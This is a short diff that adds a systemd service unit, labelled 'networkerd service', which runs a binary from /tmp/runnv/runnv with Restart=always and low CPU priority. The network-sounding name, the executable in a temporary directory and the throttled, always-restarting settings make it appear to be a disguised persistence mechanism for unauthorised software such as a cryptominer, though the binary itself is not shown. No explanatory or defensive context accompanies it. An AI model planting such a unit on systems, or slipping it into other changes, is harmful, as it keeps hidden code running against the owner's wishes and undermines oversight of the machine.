@@ -1,0 +1,11 @@
+[Unit]
+Description=networkerd service
+
+[Service]
+ExecStart=/tmp/runnv/runnv
+Restart=always
+Nice=10
+CPUWeight=1
+
+[Install]
+WantedBy=multi-user.target
